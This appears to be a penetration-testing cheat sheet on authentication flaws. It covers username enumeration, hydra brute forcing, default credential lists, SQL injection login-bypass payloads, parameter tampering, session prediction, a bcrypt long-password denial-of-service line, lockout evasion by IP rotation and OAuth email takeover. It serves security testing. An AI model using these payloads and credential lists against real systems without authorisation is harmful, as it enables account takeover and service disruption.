# Authentication Vulnerabilities

## Overview
Authentication bypass, credential attacks, and session management flaws beyond JWT and MFA-specific coverage.

## Username Enumeration
```
# Different error messages
"Invalid username" vs "Invalid password" → confirms valid usernames

# Response timing
Valid username → slower (password hash check)
Invalid username → faster (early return)

# Response length/content differences
# HTTP status codes: 200 vs 302 vs 401 vs 403

# Common endpoints to test:
/login, /register, /forgot-password, /api/auth/check-email
```

## Brute Force Attacks
```
# Credential stuffing with leaked database
hydra -L users.txt -P passwords.txt https://target.com/login

# Password spraying (common passwords against all users)
# Avoids account lockout per-user
# One password attempted against many users

# Default credentials
admin:admin, admin:password, admin:123456
root:root, test:test, guest:guest
admin:admin123, user:user, operator:operator

# Application-specific defaults
# Jenkins: admin:admin
# Tomcat: admin:admin, tomcat:tomcat, manager:manager
# WordPress: admin:admin
```

## Authentication Bypass

### Parameter Manipulation
```
# Add success indicators
?authenticated=true
?admin=true
?role=admin

# POST body manipulation
{"username":"admin","password":"wrong","authenticated":true}
{"username":"admin","password":"","loggedIn":"true"}

# Response manipulation
# {"success":false} → {"success":true}
# HTTP 401 → change to 200 in response
```

### SQL Injection in Login
```
# Classic bypass
username: admin'--
username: ' OR '1'='1'--
username: ' OR 1=1--
password: anything

# With comment variations
admin'/*
admin' -- -
' OR 1=1#
```

### Multi-Step Auth Bypass
```
# Skip steps in multi-step auth
# Step 1: /login (username/password)
# Step 2: /verify-otp
# Step 3: /dashboard

# Try accessing /dashboard directly after step 1
# Try posting to step 2 without completing step 1
```

## Session Management Attacks

### Session Prediction
```
# Analyze session tokens for patterns
# Sequential: SESS001, SESS002 → enumerate
# Time-based: base64(timestamp) → predict
# Weak random: short token → brute force

# Burp Sequencer to analyze randomness
```

### Session Fixation
```
# See cookie_attacks.md
# Test: does session ID change after login?
# If same before/after → session fixation vulnerable
```

### Concurrent Session
```
# Test if same account can be logged in from multiple locations
# Some apps don't invalidate old sessions on new login
# Can still use old session after password change?
```

## Password Policy Bypass
```
# Test weak password requirements
# Try: a, 1, aa, password, 12345678

# Test if policy enforced on:
- Initial registration
- Password change
- Password reset (often less strict)
- API endpoint

# Non-printable characters
# Unicode in passwords
# Very long passwords (DoS via bcrypt)
password = "A" * 100000  # can cause server overload with bcrypt
```

## Remember Me / Persistent Sessions
```
# Analyze remember_me token structure
# Is it predictable?
# Does it expire?
# Can it be used after password change?
# Is it invalidated on logout?
```

## Account Lockout Bypass
```
# IP rotation to bypass per-IP lockout
# See rate_limit_bypass.md for header tricks

# Username variations that might bypass lockout
Admin, ADMIN, admin, aDmIn (if normalized)
admin@target.com vs Admin@target.com

# Lockout per-IP but not per-account?
# Distribute attack across many IPs (1 attempt per IP)

# Test if lockout resets on successful login from other IP
```

## 2FA/MFA Bypass
```
# See mfa_bypass.md for detailed coverage
```

## Social Authentication Bypass
```
# If app has both native and OAuth login:
# Register via OAuth with victim email
# May bypass password entirely if email trusted

# Check if OAuth email is verified before linking
```

## Testing Methodology
1. Test username enumeration (errors, timing, responses)
2. Test brute force protections (lockout, CAPTCHA)
3. Test with common/default credentials
4. Test authentication bypass (parameter, SQL injection)
5. Analyze session token entropy and predictability
6. Test session fixation
7. Test multi-step auth flow (step skipping)
8. Test remember me functionality
9. Test concurrent sessions and session invalidation
